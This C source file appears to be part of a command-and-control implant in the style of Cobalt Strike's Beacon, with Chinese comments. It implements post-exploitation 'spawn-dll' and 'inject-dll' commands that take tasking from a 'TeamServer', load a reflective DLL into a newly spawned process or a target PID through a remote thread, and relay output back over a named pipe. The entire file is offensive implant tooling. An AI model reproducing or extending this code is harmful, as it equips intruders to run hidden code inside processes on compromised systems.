#include "postex_internal.h"

/* 初始化 PostEx 启动请求默认值。 */
static VOID PostExInitStartRequest(PostExStartRequest* req)
{
    if (!req) return;
    ZeroMemory(req, sizeof(*req));
    req->backend_kind = POSTEX_BACKEND_REMOTE_THREAD;
    BbInit(&req->dll);
}

/* 释放 PostEx 启动请求持有的 DLL 缓冲区。 */
static VOID PostExFreeStartRequest(PostExStartRequest* req)
{
    if (!req) return;
    BbFree(&req->dll);
    ZeroMemory(req, sizeof(*req));
}

/* 复制可选字符串参数并生成字段化错误。 */
static BOOL PostExCopyArg(CHAR* dst, SIZE_T dst_size, const CHAR* src,
                          const CHAR* name, CHAR* err, SIZE_T err_size)
{
    SIZE_T len;

    if (!dst || dst_size == 0) {
        return PostExSetError(err, err_size, "invalid postex argument buffer");
    }
    dst[0] = '\0';
    if (!src || !src[0]) {
        return TRUE;
    }

    len = strlen(src);
    if (len >= dst_size) {
        if (err && err_size) {
            _snprintf_s(err, err_size, _TRUNCATE,
                        "postex %s too long (max %Iu bytes)",
                        name ? name : "argument",
                        dst_size - 1);
        }
        return FALSE;
    }
    strcpy_s(dst, dst_size, src);
    return TRUE;
}

/* 解析 spawn-dll 请求参数。 */
static BOOL PostExParseSpawnRequest(struct BeaconContext* ctx, UINT32 task_id,
                                    Parser* parser, PostExStartRequest* req,
                                    CHAR* err, SIZE_T err_size)
{
    CHAR* description = NULL;
    CHAR* args = NULL;
    CHAR* spawn_path = NULL;
    CHAR* spawn_args = NULL;
    BOOL ok = TRUE;

    PostExInitStartRequest(req);
    if (!ctx || !parser || task_id == 0) {
        return PostExSetError(err, err_size, "invalid postex spawn request");
    }

    /* wire 参数顺序必须和 TeamServer 下发格式保持一致。 */
    req->task_id = task_id;
    req->api = &ctx->api;
    req->subcmd = POSTEX_SUBCMD_SPAWN_DLL;
    req->owns_process = TRUE;
    req->wait_ms = ParserU32(parser);
    req->max_runtime_ms = ParserU32(parser);
    req->idle_timeout_ms = ParserU32(parser);
    description = ParserString(parser);
    args = ParserString(parser);
    spawn_path = ParserString(parser);
    spawn_args = ParserString(parser);
    req->dll = ParserBytes(parser);

    if (parser->error[0]) {
        PostExSetError(err, err_size, parser->error);
    } else if (!PostExBuildPipeName(ctx, task_id, req->pipe_name, sizeof(req->pipe_name))) {
        PostExSetError(err, err_size, "postex pipe name build failed");
    }

    if (!PostExHasError(err)) {
        ok = PostExCopyArg(req->description, sizeof(req->description), description,
                           "description", err, err_size) &&
             PostExCopyArg(req->module_args, sizeof(req->module_args), args,
                           "module args", err, err_size) &&
             PostExCopyArg(req->spawn_path, sizeof(req->spawn_path), spawn_path,
                           "spawn path", err, err_size) &&
             PostExCopyArg(req->spawn_args, sizeof(req->spawn_args), spawn_args,
                           "spawn args", err, err_size);
    }

    HeapFree(GetProcessHeap(), 0, description);
    HeapFree(GetProcessHeap(), 0, args);
    HeapFree(GetProcessHeap(), 0, spawn_path);
    HeapFree(GetProcessHeap(), 0, spawn_args);
    return ok && !PostExHasError(err);
}

/* 解析 inject-dll 请求参数。 */
static BOOL PostExParseInjectRequest(struct BeaconContext* ctx, UINT32 task_id,
                                     Parser* parser, PostExStartRequest* req,
                                     CHAR* err, SIZE_T err_size)
{
    CHAR* description = NULL;
    CHAR* args = NULL;
    BOOL ok = TRUE;

    PostExInitStartRequest(req);
    if (!ctx || !parser || task_id == 0) {
        return PostExSetError(err, err_size, "invalid postex inject request");
    }

    /* inject 请求不创建宿主进程，只需要目标 PID。 */
    req->task_id = task_id;
    req->api = &ctx->api;
    req->subcmd = POSTEX_SUBCMD_INJECT_DLL;
    req->wait_ms = ParserU32(parser);
    req->max_runtime_ms = ParserU32(parser);
    req->idle_timeout_ms = ParserU32(parser);
    description = ParserString(parser);
    args = ParserString(parser);
    req->target_pid = ParserU32(parser);
    req->dll = ParserBytes(parser);

    if (parser->error[0]) {
        PostExSetError(err, err_size, parser->error);
    } else if (!PostExBuildPipeName(ctx, task_id, req->pipe_name, sizeof(req->pipe_name))) {
        PostExSetError(err, err_size, "postex pipe name build failed");
    }

    if (!PostExHasError(err)) {
        ok = PostExCopyArg(req->description, sizeof(req->description), description,
                           "description", err, err_size) &&
             PostExCopyArg(req->module_args, sizeof(req->module_args), args,
                           "module args", err, err_size);
    }

    HeapFree(GetProcessHeap(), 0, description);
    HeapFree(GetProcessHeap(), 0, args);
    return ok && !PostExHasError(err);
}

/* 校验 PostEx 启动请求的必要字段。 */
static BOOL PostExValidateStartRequest(const PostExStartRequest* req,
                                       CHAR* err, SIZE_T err_size)
{
    if (!req || req->task_id == 0) {
        return PostExSetError(err, err_size, "invalid postex request");
    }
    if (!req->dll.data || req->dll.len < sizeof(IMAGE_DOS_HEADER)) {
        return PostExSetError(err, err_size, "postex reflective DLL bytes are empty");
    }
    if (req->subcmd == POSTEX_SUBCMD_SPAWN_DLL && !req->spawn_path[0]) {
        return PostExSetError(err, err_size, "postex spawn path is empty");
    }
    if (req->subcmd == POSTEX_SUBCMD_INJECT_DLL && req->target_pid == 0) {
        return PostExSetError(err, err_size, "postex target pid is empty");
    }
    if (req->subcmd != POSTEX_SUBCMD_SPAWN_DLL &&
        req->subcmd != POSTEX_SUBCMD_INJECT_DLL) {
        return PostExSetError(err, err_size, "unknown postex subcommand");
    }
    return TRUE;
}

/* 构建 pipe 连接失败时的诊断返回。 */
static ByteBuf PostExPipeConnectFailed(const PostExStartRequest* req,
                                       PostExStartResult* result)
{
    CHAR thread_status[96];
    CHAR config_status[96];
    ByteBuf out;
    DWORD err;

    err = GetLastError();
    PostExFormatRemoteThreadStatus(result ? result->remote_thread : NULL,
                                   thread_status, sizeof(thread_status));
    PostExFormatRemoteConfigStatus(result ? result->process : NULL,
                                   result ? result->remote_config : NULL,
                                   config_status, sizeof(config_status));
    PostExCloseStartedBackend(req, INVALID_HANDLE_VALUE, result);

    BbInit(&out);
    BbPrintf(&out, "postex pipe connect failed: %lu (%s; %s)",
             (ULONG)err, thread_status, config_status);
    return out;
}

/* 启动远端 PostEx 后端、连接 pipe 并注册 job。 */
static ByteBuf PostExRunRemoteRequest(struct BeaconContext* ctx,
                                      PostExStartRequest* req)
{
    CHAR errbuf[POSTEX_ERROR_MAX] = { 0 };
    HANDLE pipe = INVALID_HANDLE_VALUE;
    PostExStartResult result;

    PostExStartResultInit(&result);

    if (!PostExValidateStartRequest(req, errbuf, sizeof(errbuf))) {
        return BbFromText(errbuf);
    }

    if (!PostExCanStartJob(ctx, req->task_id, errbuf, sizeof(errbuf))) {
        return BbFromText(errbuf);
    }

    if (!PostExStartRemote(req, &result, errbuf, sizeof(errbuf))) {
        return BbFromText(errbuf[0] ? errbuf : "postex remote start failed");
    }

    /* 后端启动成功后，pipe 连接成功才注册为可轮询 job。 */
    if (!PostExConnectPipe(req->pipe_name, &pipe)) {
        return PostExPipeConnectFailed(req, &result);
    }

    PostExWaitData(pipe, req->wait_ms);
    return PostExRegisterStartedJob(ctx, req, pipe, &result);
}

/* spawn-dll 子命令入口。 */
ByteBuf PostExSpawnDll(struct BeaconContext* ctx, UINT32 task_id, Parser* parser)
{
    PostExStartRequest req;
    CHAR errbuf[POSTEX_ERROR_MAX] = { 0 };
    ByteBuf out;

    if (!PostExParseSpawnRequest(ctx, task_id, parser, &req, errbuf, sizeof(errbuf))) {
        PostExFreeStartRequest(&req);
        return BbFromText(errbuf);
    }

    out = PostExRunRemoteRequest(ctx, &req);
    PostExFreeStartRequest(&req);
    return out;
}

/* inject-dll 子命令入口。 */
ByteBuf PostExInjectDll(struct BeaconContext* ctx, UINT32 task_id, Parser* parser)
{
    PostExStartRequest req;
    CHAR errbuf[POSTEX_ERROR_MAX] = { 0 };
    ByteBuf out;

    if (!PostExParseInjectRequest(ctx, task_id, parser, &req, errbuf, sizeof(errbuf))) {
        PostExFreeStartRequest(&req);
        return BbFromText(errbuf);
    }

    out = PostExRunRemoteRequest(ctx, &req);
    PostExFreeStartRequest(&req);
    return out;
}
